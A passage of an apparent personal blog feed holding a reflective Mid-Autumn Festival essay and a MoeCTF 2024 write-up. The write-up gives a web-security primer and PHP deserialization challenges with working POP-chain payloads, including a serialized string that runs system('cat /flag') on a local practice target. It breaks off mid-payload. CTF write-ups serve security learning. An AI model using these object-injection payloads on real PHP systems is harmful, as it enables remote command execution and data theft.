    <categories>
      
      <category>Love &amp; Life</category>
      
      <category>Movie</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2024中秋节忏悔录</title>
    <link href="/dong.github/2024/09/16/D-midautumn2024/"/>
    <url>/dong.github/2024/09/16/D-midautumn2024/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>“许多年之后，面对一轮圆月，卷D先生将会回想起，他自己带他去见识孤独的那个遥远的下午。”</strong></p><span id="more"></span><p><img src="/dong.github/images/moon.png" alt="moon by potatoe&#39;s camera"><br><strong>“西北望乡何处是，东南见月几回圆。”</strong><br><strong>“昨风一吹无人会，今夜清光似往年。”</strong></p><p>又是一年中秋节，还是那么圆，那么亮的月亮，可惜时间飞逝，我们再也回不去了。<br>W卷：“你看今年川大的高考分数线，涨了多少，今年上川大网安需要1000多名省排了。”<br>说着，他挨个数起了班上的人，“看你超过了多少人……”<br>w卷还是像以前一样。可是他不经意间，我被戳中了。<br>从那之后，西出阳关再无故人；曲终人散，人走茶凉，往后却是一大片一大片的荒芜，是的，只有失去之后才懂得珍惜，失去后才明白有多珍贵，我不止一次地幻想着能回到过去的那些日子里，可是梦醒之后只剩下后悔。<strong>我们都太忙着赶路了，错过了太多珍贵的东西。</strong></p><p>每年的毕业季，中秋节，聚散之时，我都难以平静。<br><strong>“一个人和一个人相遇的概率是千万分之一，而他们成为朋友的概率只有两亿分之一”</strong>，人和人的相遇本身就非常不容易，而在这广袤的宇宙中，在茫茫人海中，能够有个朋友是多么幸运的事。</p><p>可惜我当时却不懂，只知道埋头苦干，没完没了的刷题，没完没了的内卷。直到今天我还都觉得，人怎么可以把事做得这么极端。一个人，每天除了吃饭睡觉就是做题，不跟别人聊天，不参与社交，到点就出去跑3公里，回去又是学习。我真是个差劲的人。是的，我嘲笑过躺平，认为那是不珍惜生命的行为，也是对自己，对自己爱的和爱自己的人事物不负责的行为。到头来想，其实最应该被讽刺的是我才对。<br>你说，生命的意义在哪里？被吹捧，被追慕，拥有花不完的金钱，用不完的权力，可以让人暂时摆脱孤独的枷锁，却终究空虚的，因为是非成败转头空，是肤浅的。<strong>而那些美好的记忆，那种打开回忆时愉悦的感觉，拿什么都换不来的。</strong></p><p>我小时候就想着，我要做个平凡、快乐的小人物，平平安安度过这平凡的一生。爸爸知道我属鸡，就叫我小名虫虫，希望我能天天开心快乐。可是到现在为止19年了，<strong>平凡是够平凡了，可是快乐到哪去了呢？</strong>还是陷入失落，在没完没了的学习中忘掉悲伤……</p><p><strong>[事件]</strong> 之后，就再无友了。曾经那些要要好一辈子的伙伴，我以为的至交，都去哪了呢。可能，这只是我的一面之交。从来都只是我给别人过生日，我用自己的失败安慰别人、取悦别人，衬托他们的成功，用自己的热情去填充别人的失落空虚。妈妈警告过我，这个就叫缺心眼，不要对别人没底线的好。朋友本身或许就是个伪命题，我当时只作不懂。后来慢慢明白了，<strong>淡了，无所谓了</strong>。可是，想起那年却唯独有一个人能记得我的生日，而我却那样对待她。我真是太差劲了。又菜又爱卷，冷落了别人，伤了别人。</p><p>朋友圈还是会看的，也是会酸的。看到别人的生活总是那么热闹，那么热烈，那么精彩，那么充实，而我却每天在宿舍做“下水道的老鼠”，还是会失落的。</p><p>如果当初，要是我能回到一节下午的自习课，我决不学习。我要全身心投入地跟你们聊天，聊未来，聊梦想，分享那青春岁月的喜与乐，悲与苦，描述那些未来的无限可能，梦想这个世界的无限精彩，和你们做最最好的朋友。<strong>如果当初呢，过去就是过去，再也回不去了。</strong>悲。</p><p>痴人说梦矣。<br>或许，此时此刻，正如彼时彼刻。<strong>不被珍惜的现在，却又是未来憧憬了无数次的过去？</strong></p><p>大学的路是陡坡，大学的朋友是荒芜。可能吗？一年已过，我已没什么期待。<br>但是卷D还是卷D，和当年一样，加快赶路的脚步了。</p><p>好。忏悔完毕，早点睡觉，明天又是工作日。</p>]]></content>
    
    
    <categories>
      
      <category>Love &amp; Life</category>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Moe2024</title>
    <link href="/dong.github/2024/09/13/Moe2024/"/>
    <url>/dong.github/2024/09/13/Moe2024/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>2024MoeCTF小结，挑一些题记下笔记</strong></p><span id="more"></span><h1 id="Web渗透测试与审计入门指北"><a href="#Web渗透测试与审计入门指北" class="headerlink" title="Web渗透测试与审计入门指北"></a>Web渗透测试与审计入门指北</h1>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-cff048a9" role="button" aria-expanded="false" aria-controls="collapse-cff048a9">        <div class="fold-arrow">▶</div>入门指北      </div>      <div class="fold-collapse collapse" id="collapse-cff048a9">        <div class="fold-content">          <h1 id="moectf2024-web入门指北"><a href="#moectf2024-web入门指北" class="headerlink" title="moectf2024 web入门指北"></a>moectf2024 web入门指北</h1><p>xt</p><h2 id="一-web是啥"><a href="#一-web是啥" class="headerlink" title="一.web是啥"></a>一.web是啥</h2><p>互联网时代，web应用以及涉及到生活中的方方面面，与后端交互的软件呀，浏览器看到的web<br>网页呀。ctf中web一般涉及web网页安全，通过利用网页前后端的漏洞（代码漏洞也好，服务器<br>漏洞也好）获取关键数据flag，一上来首先需要大家自己搭建一个基本的网站，了解网站的基本<br>架构，连网站是怎么运行的都不知道何谈找漏洞呢。</p><h2 id="二-学习方法"><a href="#二-学习方法" class="headerlink" title="二.学习方法"></a>二.学习方法</h2><p>不懂就搜（善用ai和搜索引擎，小到软件怎么使用，大到某一个庞大的知识点，可以使用多个搜<br>索引擎，推荐google和<a href="http://www.bing），不懂就问（大雪参必备技能---脸皮厚），推荐blog网站：">www.bing），不懂就问（大雪参必备技能---脸皮厚），推荐blog网站：</a><br>先知社区，freebuf</p><h2 id="三-学习路线"><a href="#三-学习路线" class="headerlink" title="三.学习路线"></a>三.学习路线</h2><p>配置环境(最难最烦):你可以去搜教程看文档，在配置期间你可能会<br>遇到各种各种看不懂得错误，要有耐心，环境需要边学边配置，这里<br>简单列举好用的<br>1.linux操作系统需要学习（先学会简单使用shell）使用vm虚拟机装个linux发行版吧，用多了相<br>信你会喜欢linux<br>2.浏览器及其插件（hackbar，ProxySwitchyOmega，Wappalyzer）<br>3.常用工具（BurpSuite，PHPStudy，Antsword，dirsearch）安装使用想必你会自己搜叭<br>4.杂七杂八（clash，uTools，Everything）还有一些常用的网站（fofa,cmd5,站长之家）等等<br>路线指南：<br>基础知识：（目标搭建自己的第一个网站）<br>1.基本的网络协议（重点http）http的请求头请求体请求方法<br>2.编码与加解密知识，经典的base64，hash等等，需要一点基本的密码知识<br>可供参考的资料：<a href="https://www.cnblogs.com/ruoli-s/p/14206145.html">https://www.cnblogs.com/ruoli-s/p/14206145.html</a><br>3.认证方法（cookie，session，jwt）<br>4.前端三要素（html，css，javascript）css知道就好，粗体为重点<br>5.后端（先从最简单的php开始）开发简单动态网站（使用phpstudy或者手动安装lamp）<br>6.数据库（先简单学习Mysql）能实现增删改查<br>7.一个趁手的脚本语言（推荐python）能够实现简单爬虫7.学会使用重要的工具，刚开始不用陷<br>入学工具，简单学会使用burpsuite就行<br>信息搜集：<br>知道一个网站是什么框架等等<br>初探漏洞：<br>web漏洞多到数不清，先从top10学起，以下只给部分介绍，可以从php语言来看这些漏洞是如<br>何产生的，又怎样修补避免呢，攻击时怎么绕过某些阻碍</p><h3 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h3><p>就是拼接sql语句实现读取数据库信息（信息泄露），篡改，甚至删除数据库信息，有多种注入方<br>式和利用技巧，注入类的漏洞很多但都大差不差，sql注入算是经典中的经典，学习的时候不要只<br>看不操作，可以找靶场玩玩<br>推荐靶场：sql-libs</p><h3 id="2-php的安全问题"><a href="#2-php的安全问题" class="headerlink" title="2.php的安全问题"></a>2.php的安全问题</h3><p>php使用不当会容易出现很多漏洞，&#x3D;&#x3D;，&#x3D;&#x3D;&#x3D;使用不当导致php弱类型呀啥的，而且php语言太<br>灵活容易被利用<br>文件包含，主要由函数include()，require()，include_once()，require_once()造成他们包含的<br>文件会被解析成php代码执行<br>变量覆盖，关键变量能被用户控制从而导致问题<br>远程代码执行（rce），比如eval()中的代码能够让用户控制（eval($_POST[‘code’]);）<br>等等种种</p><h3 id="3-前端安全（xss-csrf等等）"><a href="#3-前端安全（xss-csrf等等）" class="headerlink" title="3.前端安全（xss, csrf等等）"></a>3.前端安全（xss, csrf等等）</h3><p>由前端造成的漏洞<br>xss：用户通过html注入篡改网页前端，一般插入javascript使得别人访问时自动运行，比如评论<br>区啥的很多很多甚至用户名都行，只要没啥过滤，都可以让浏览器渲染执行，ctf中主要是窃取<br>cookie<br>推荐靶场：xss-libs<br>Csrf: 攻击者可以使得受害者发送http的请求（如果受害者的token没过期的话，嘿嘿）</p><h3 id="4-服务端请求伪造-ssrf"><a href="#4-服务端请求伪造-ssrf" class="headerlink" title="4.服务端请求伪造(ssrf)"></a>4.服务端请求伪造(ssrf)</h3><p>用户能使服务器发送http请求，一般我们是向服务器发请求，而ssrf是使得服务器计算机发出<br>http请求</p><h3 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5.文件上传"></a>5.文件上传</h3><p>用户在上传文件功能的地方（头像呀什么的）上传可执行脚本获得shell（php一句话木马），在<br>服务器可以执行有害命令</p><h3 id="6-其他"><a href="#6-其他" class="headerlink" title="6.其他"></a>6.其他</h3><p>各种语言的反序列化，nodejs原型链污染， ssti，xxe，各种cms，组件漏洞啥的</p><h2 id="四-练习"><a href="#四-练习" class="headerlink" title="四.练习"></a>四.练习</h2><p>靶场推荐<br>攻防世界（有入门靶场）<br>Bugku<br>Buuctf<br>ctfhub<br>Nssctf<br>不会可以查看wp,一定搞清楚原理,可以学完一个漏洞就找相同类型的靶场打一打（瞎jb乱打不是<br>很建议）<br>最后建议多看书多看博客社区多了解，祝大家可以在ctf中玩的开心</p>        </div>      </div>    </div><h1 id="Pop-base-mini-moe"><a href="#Pop-base-mini-moe" class="headerlink" title="Pop base mini moe"></a>Pop base mini moe</h1><h3 id="protected和public修饰的属性在序列化中是有区别的"><a href="#protected和public修饰的属性在序列化中是有区别的" class="headerlink" title="protected和public修饰的属性在序列化中是有区别的"></a>protected和public修饰的属性在序列化中是有区别的</h3><h3 id="在实例中无法通过-obj-属性名-或方法名-来调用pravite类型的方法或属性"><a href="#在实例中无法通过-obj-属性名-或方法名-来调用pravite类型的方法或属性" class="headerlink" title="在实例中无法通过$obj-&gt;属性名(或方法名) 来调用pravite类型的方法或属性"></a>在实例中无法通过$obj-&gt;属性名(或方法名) 来调用pravite类型的方法或属性</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//private和public序列化字符串差异</span><br><span class="hljs-comment">///?data=O:1:&quot;A&quot;:2:&#123;s:7:&quot;Aevil&quot;;s:2:&quot;ls&quot;;s:4:&quot;Aa&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;Bb&quot;;s:6:&quot;system&quot;;&#125;&#125;</span><br><span class="hljs-comment">///?data=O:1:&quot;A&quot;:2:&#123;s:4:&quot;evil&quot;;s:2:&quot;ls&quot;;s:1:&quot;a&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;Bb&quot;;s:6:&quot;system&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-dcdac752" role="button" aria-expanded="false" aria-controls="collapse-dcdac752">        <div class="fold-arrow">▶</div>题目代码      </div>      <div class="fold-collapse collapse" id="collapse-dcdac752">        <div class="fold-content">          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-comment">// 注意 private 属性的序列化哦</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$evil</span>;<br><br>    <span class="hljs-comment">// 如何赋值呢</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$s</span>(<span class="hljs-variable language_">$this</span>-&gt;evil);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>) </span>&#123;<br>        <span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-variable">$s</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<br><br><br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br> &#123;<br>     <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> &#125;<br><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6ae3e036" role="button" aria-expanded="false" aria-controls="collapse-6ae3e036">        <div class="fold-arrow">▶</div>payload1      </div>      <div class="fold-collapse collapse" id="collapse-6ae3e036">        <div class="fold-content">          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-comment">// 注意 private 属性的序列化哦</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$evil</span>;<br> <br>    <span class="hljs-comment">// 如何赋值呢</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;evil=<span class="hljs-string">&quot;ls&quot;</span>;<br>    &#125;<br> <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;system&quot;</span>;<br> <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>());<br> <br>http:<span class="hljs-comment">//127.0.0.1:63135/?data=O:1:&quot;A&quot;:2:&#123;s:7:&quot;%00A%00evil&quot;;s:9:&quot;cat /flag&quot;;s:4:&quot;%00A%00a&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;%00B%00b&quot;;s:6:&quot;system&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-9c51fa20" role="button" aria-expanded="false" aria-controls="collapse-9c51fa20">        <div class="fold-arrow">▶</div>payload2      </div>      <div class="fold-collapse collapse" id="collapse-9c51fa20">        <div class="fold-content">          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-comment">// 注意 private 属性的序列化哦</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evil</span>;<br><br>    <span class="hljs-comment">// 如何赋值呢</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;evil = <span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br>        <span class="hljs-comment">// $s($this-&gt;evil);</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$object</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$string</span> ;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div><h2 id="Note-低版本的php是可以通过public直接覆盖掉private进行绕过的，我的payload2采用了这种做法。"><a href="#Note-低版本的php是可以通过public直接覆盖掉private进行绕过的，我的payload2采用了这种做法。" class="headerlink" title="Note:低版本的php是可以通过public直接覆盖掉private进行绕过的，我的payload2采用了这种做法。"></a>Note:低版本的php是可以通过public直接覆盖掉private进行绕过的，我的payload2采用了这种做法。</h2><p><strong>原先通过构造函数的方式对private修饰的属性一直过不了，出现的报错是：Uncaught Error: Function name must be a string，根本没有完成赋值，后来终于找到了这个坑点：（引用先知社区）</strong><br><img src="/dong.github/images/0914.png"><br><strong>会发现在Threezh1的左右，也就是属性名中的类名左右存在两个空字节。所以反序列化不成功的原因就是由于序列化内容生成到网页后，空字节不会一同生成出去，导致反序列化的时候无法识别是private属性，反序列化失败。</strong><br><img src="/dong.github/images/0914-1.png"><br><strong>那解决这个问题的方法就是，在传递反序列化字符串中，在类名的左右加上%00，也就是空字节对于的URL编码。</strong><br><strong>于是就有了payload1（正解）</strong></p><h1 id="Pop-moe"><a href="#Pop-moe" class="headerlink" title="Pop moe"></a>Pop moe</h1>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-05eef982" role="button" aria-expanded="false" aria-controls="collapse-05eef982">        <div class="fold-arrow">▶</div>题目      </div>      <div class="fold-collapse collapse" id="collapse-05eef982">        <div class="fold-content">          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class000</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$payl0ad</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$what</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;payl0ad === <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;FAILED TO ATTACK&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;what;<br>        <span class="hljs-variable">$a</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class001</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payl0ad</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;payload = <span class="hljs-variable language_">$this</span>-&gt;payl0ad;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class002</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$sec</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$b</span>(<span class="hljs-variable language_">$this</span>-&gt;sec);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dangerous</span>(<span class="hljs-params"><span class="hljs-variable">$whaattt</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$whaattt</span>-&gt;<span class="hljs-title function_ invoke__">evvval</span>(<span class="hljs-variable">$this</span>-&gt;sec);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class003</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mystr</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evvval</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;mystr;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-90469042" role="button" aria-expanded="false" aria-controls="collapse-90469042">        <div class="fold-arrow">▶</div>payload      </div>      <div class="fold-collapse collapse" id="collapse-90469042">        <div class="fold-content">          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class000</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span>  <span class="hljs-variable">$payl0ad</span>;<br><span class="hljs-keyword">public</span>  <span class="hljs-variable">$what</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;payl0ad = <span class="hljs-string">&#x27;0&#x27;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;what = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class001</span>();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class001</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span 